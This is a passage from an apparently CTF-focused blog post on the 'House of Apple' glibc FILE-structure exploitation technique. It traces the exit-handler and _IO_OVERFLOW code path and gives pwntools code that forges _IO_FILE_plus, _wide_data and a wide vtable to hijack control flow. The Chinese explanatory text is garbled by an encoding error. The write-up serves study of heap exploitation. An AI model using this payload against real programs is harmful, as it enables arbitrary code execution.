(void *arg, int status);\t      void *arg;\t    case ef_free:\t    case ef_us:\t      break;\t    case ef_on:\t      onfct = f-&gt;func.on.fn;\t      arg = f-&gt;func.on.arg;\t      PTR_DEMANGLE (onfct);\t      /* Unlock the list while we call a foreign function.  */\t      __libc_lock_unlock (__exit_funcs_lock);\t      onfct (status, arg);\t      __libc_lock_lock (__exit_funcs_lock);\t      break;\t    case ef_at:\t      atfct = f-&gt;func.at;\t      PTR_DEMANGLE (atfct);\t      /* Unlock the list while we call a foreign function.  */\t      __libc_lock_unlock (__exit_funcs_lock);\t      atfct ();\t      __libc_lock_lock (__exit_funcs_lock);\t      break;\t    case ef_cxa:\t      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),\t\t we must mark this function as ef_free.  */\t      f-&gt;flavor = ef_free;\t      cxafct = f-&gt;func.cxa.fn;\t      arg = f-&gt;func.cxa.arg;\t      PTR_DEMANGLE (cxafct);\t      /* Unlock the list while we call a foreign function.  */\t      __libc_lock_unlock (__exit_funcs_lock);\t      cxafct (arg, status);\t      __libc_lock_lock (__exit_funcs_lock);\t      break;\t    }\t  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))\t    /* The last exit function, or another thread, has registered\t       more exit functions.  Start the loop over.  */\t    goto restart;\t}      *listp = cur-&gt;next;      if (*listp != NULL)\t/* Don't free the last element in the chain, this is the statically\t   allocate element.  */\tfree (cur);    }  __libc_lock_unlock (__exit_funcs_lock);  if (run_list_atexit)    call_function_static_weak (_IO_cleanup);  _exit (status);}voidexit (int status){  __run_exit_handlers (status, &amp;__exit_funcs, true, true);}libc_hidden_def (exit)\n_IO_cleanup()\nåœ¨__run_exit_handlers ä¸­è°ƒç”¨äº†_IO_cleanupï¼Œå®ƒåœ¨ /libio/genops.c ä¸­æœ‰å®šä¹‰:\nint_IO_cleanup (void){  int result = _IO_flush_all ();  /* We currently don't have a reliable mechanism for making sure that     C++ static destructors are executed in the correct order.     So it is possible that other static destructors might want to     write to cout - and they're supposed to be able to do so.     The following will make the standard streambufs be unbuffered,     which forces any output from late destructors to be written out. */  _IO_unbuffer_all ();  return result;}\n_IO_flush_all()\nåŒæ ·åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°_IO_flush_all:\nint_IO_flush_all (void){  int result = 0;  FILE *fp;#ifdef _IO_MTSAFE_IO  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);#endif  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)    {      run_fp = fp;      _IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;      _IO_funlockfile (fp);      run_fp = NULL;    }#ifdef _IO_MTSAFE_IO  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (0);#endif  return result;}\nvoid_cthreads_flockfile (FILE *fp){  _IO_lock_lock (*fp-&gt;_lock);}// ...void _IO_flockfile (FILE *)     __attribute__ ((alias (\"_cthreads_flockfile\")));// ...\n_IO_FILE_plus åœ¨ /libio/stdfiles.c æœ‰å®šä¹‰\nä¸»è¦å…³æ³¨è¿™ä¸ªå‡½æ•°ä¸­çš„åˆ¤æ–­æ¡ä»¶ï¼Œå¦‚æœå‰é¢çš„æ¡ä»¶æ»¡è¶³ï¼Œä¼šè¿›å…¥_IO_OVERFLOW (fp, EOF)ï¼Œè¿™æ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œä½äº /libio/libioP.hï¼š\n/* Type of MEMBER in struct type TYPE.  */#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing   violation in case THIS has a different pointer type.  */#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \\  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \\\t\t\t\t       + offsetof(TYPE, MEMBER)))//...#define _IO_JUMPS_FILE_plus(THIS) \\  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)//...# define _IO_JUMPS_FUNC(THIS) \\  (IO_validate_vtable                                                   \\   (*(struct _IO_jump_t **) ((void  +*) &amp;_IO_JUMPS_FILE_plus (THIS)\t\\\t\t\t     + (THIS)-&gt;_vtable_offset)))\t//...#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)//...#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)//...IO_validate_vtable (const struct _IO_jump_t *vtable){  uintptr_t ptr = (uintptr_t) vtable;  uintptr_t offset = ptr - (uintptr_t) &amp;__io_vtables;  if (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;}\nå¦‚æœé€šè¿‡åˆæ³•æ€§æ£€æŸ¥ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œ_vtable-&gt;__overflow\n#define JUMP_FIELD(TYPE, NAME) TYPE NAME//...struct _IO_jump_t{//...    JUMP_FIELD(_IO_overflow_t, __overflow);//...}\nè¿™é‡Œ__overflow æ˜¯_IO_jump_t vtable ä¸­çš„è™šå‡½æ•°ï¼Œè¿™æ˜¯ GLIBC ä¸­å®ç° I/O å¤šæ€çš„æ ¸å¿ƒæœºåˆ¶\nvtable2\né€šè¿‡è™šå‡½æ•°è¡¨ï¼ˆvtableï¼‰ä¸ºä¸åŒç±»å‹çš„æ–‡ä»¶æµï¼ˆå¦‚æ–‡ä»¶ã€å†…å­˜æµã€å­—ç¬¦ä¸²æµï¼‰æä¾›ç»Ÿä¸€çš„æ¥å£ï¼ŒåŒæ—¶å…è®¸ä¸åŒæµç±»å‹è‡ªå®šä¹‰åº•å±‚æ“ä½œï¼ˆå¦‚è¯»ã€å†™ã€ç¼“å†²åŒºç®¡ç†ï¼‰ã€‚\næˆ‘ä»¬å¯ä»¥åœ¨ /libio/vtables.c ä¸­æ‰¾åˆ°ç›¸å…³çš„å®šä¹‰ã€‚\nconst struct _IO_jump_t __io_vtables[] attribute_relro ={  /* _IO_str_jumps  */  [IO_STR_JUMPS] =  {\tJUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_str_finish),  //...  },  [IO_WSTR_JUMPS] = {\tJUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_wstr_finish),  //...  },  //...}\nä¹Ÿå°±æ˜¯è¯´ï¼Œ__overflow\nå®é™…æ˜¯æ‰§è¡Œ__io_vtables ä¸­å·²å®šä¹‰çš„ç›¸å…³å‡½æ•°ã€‚å¦‚ finishï¼Œä¼šæ ¹æ®ä¸åŒ I/O ç±»å‹æ‰§è¡Œä¸åŒå‡½æ•°ï¼Œä¾‹å¦‚ [IO_STR_JUMPS] ä¸­æŒ‡å‘_IO_str-finishï¼›[IO_WSTR_JUMPS] ä¸­æŒ‡å‘_IO_wstr_finishã€‚\nIII. House of Apple\nåœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨_IO_JUMPS_FUNC(THIS) è¿™ä¸ªå®ä¸­éªŒè¯äº† const struct _IO_jump_t *vtable æ˜¯å¦æ˜¯åˆæ³•çš„ï¼šå³å®ƒæŒ‡å‘çš„åœ°å€æ˜¯å¦åœ¨__io_vtables çš„èŒƒå›´å†…ã€‚è¿™ä¹Ÿè®©æˆ‘ä»¬ä¸èƒ½é€šè¿‡ç›´æ¥ä¼ªé€  vtable æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚\nç„¶è€Œï¼Œæˆ‘ä»¬ä»æœ‰æœºä¼šä¿®æ”¹ vtable ä¸ºä¸åŒçš„åˆæ³•è™šè¡¨ã€‚è¿™å¯¼è‡´äº†åç»­å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚\næ„é€ _IO_FILE_plus\nä½¿ç”¨ House of Apple çš„å‰ææ˜¯ Large bin\nattackï¼Œå®ƒå°†ä¸€ä¸ªå †åœ°å€å†™åœ¨ä»»æ„åœ°å€å¤„ã€‚\nè¿™é‡Œå°† &amp;_IO_list_all å¤„å†™å¯æ§å †åœ°å€ï¼Œç„¶åå¼€å§‹ä¼ªé€ _IO_FILE_plusã€‚\nç”±äº Large bin\nattack æ˜¯æŠŠå †çš„å¤´éƒ¨ prev_size åœ°å€å†™å…¥ï¼Œè€Œä¸€èˆ¬æˆ‘ä»¬åªèƒ½ä» fd åŸŸå¼€å§‹ç¼–è¾‘ï¼Œæ‰€ä»¥ä¸‹æ–‡çš„ä¼ªé€ ä¼šä» fd å¼€å§‹ã€‚\nfake_io = flat({\t0x18:[\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\t],\t0x60:[\t\tp32(0) # _fileno\t],\t0x78:[\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\t],\t0xb0:[\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\t]})\n_wide_data è°ƒç”¨é“¾\nå°½ç®¡æ— æ³•ç›´æ¥é€šè¿‡ä¿®æ”¹ vtable æ§åˆ¶æ‰§è¡Œæµï¼Œä½†æ˜¯_wide_data-&gt;_wide_vtable åœ¨æ‰§è¡Œæ—¶ç¼ºå°‘å®‰å…¨æ£€æŸ¥ã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è°ƒç”¨é“¾ï¼Œå…¶ä¸­æ¶‰åŠåˆ°çš„æ–¹æ³•å’Œå®å¯è‡ªè¡ŒæŸ¥é˜…ï¼š\n_IO_OVERFLOW (fp, EOF)-&gt;(_IO_overflow_t) _IO_wfile_overflow-&gt;_IO_wdoallocbuf (f)-&gt;_IO_WDOALLOCATE (fp)-&gt;Backdoor(fp) # fake vtable points at\næ„é€ _wide_data,\n_wide_vtable\nä¸ºäº†ä½¿ç”¨ä¸Šé¢çš„è°ƒç”¨é“¾ï¼Œéœ€è¦ä¿®æ”¹ *_wide_data åˆ°æˆ‘ä»¬ä¼ªé€ çš„_IO_wide_dataã€‚\nè¿™é‡Œæœ‰ä¸€ä¸ªå·§å¦™çš„å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶æŒ‡å‘ä¹‹å‰ä¼ªé€ çš„_IO_FILE_plus å¤„ï¼Œå› ä¸º_IO_wide_data ä¸­éƒ¨åˆ†æˆå‘˜æ˜¯ä¸_IO_FILE ç›¸åŒçš„ã€‚\nç„¶ååœ¨_wide_data-&gt;_wide_vtable å¤„å†™æ„é€ çš„ vtable åœ°å€ã€‚\n\n\n\nimage-20250408193602020\n\n_IO_stdfile_2_lock = libc_base + 0x205700 # find your offset in gdbIO_file_addr = heap_base + 0x0d00IO_wide_data_addr = IO_file_addrwide_vtable_addr = file_addr + 0xe8-0x68 fake_io = flat({\t0x18:[\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\t],\t0x60:[\t\tp32(0) # _fileno\t],\t0x78:[\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\t],\t0x90:[\t\tp64(IO_wide_data_addr) # *_wide_data\t],\t0xb0:[\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\t],\t0xc8:[\t\tp64(libc_base+libc.sym['_IO_wfile_jumps']) # vtable\t],\t0xd0:[\t\tp64(wide_vtable_addr)\t],\t0xd8:[\t\tp64(gadget)\t]})\nè¿™æ ·ï¼Œå°±æ§åˆ¶äº†ç¨‹åºæ‰§è¡Œæµï¼Œå¹¶ä¸” $rdi = &amp;fpã€‚\nå¯¹äº House of Apple çš„å®è·µï¼Œæ‚¨ä¹Ÿå¯ä»¥é˜…è¯»æˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼šHGAME\n2025 Week 2 Writeup\nReferences\n\n\n\nçœ‹é›ªï¼šHouse of apple\nä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³•â†©ï¸\nçœ‹é›ªï¼šPwn å †åˆ©ç”¨å­¦ä¹  â€”â€”\nFSOPã€House of Orangeâ†©ï¸\n\n\n","categories":["CTF"],"tags":["pwn","FSOP","House of Apple"]}]